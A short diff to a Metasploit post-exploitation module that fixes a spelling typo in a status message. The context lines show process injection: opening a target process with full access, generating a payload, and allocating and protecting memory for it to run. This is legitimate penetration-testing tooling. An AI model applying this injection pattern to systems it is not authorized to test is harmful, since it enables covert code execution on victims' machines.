@@ -184,7 +184,7 @@ class MetasploitModule < Msf::Post
         host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
         print_status("Generating payload")
         raw = pay.generate
-        print_status("Allocating memory in procees #{pid}")
+        print_status("Allocating memory in process #{pid}")
         mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
         # Ensure memory is set for execution
         host_process.memory.protect(mem)
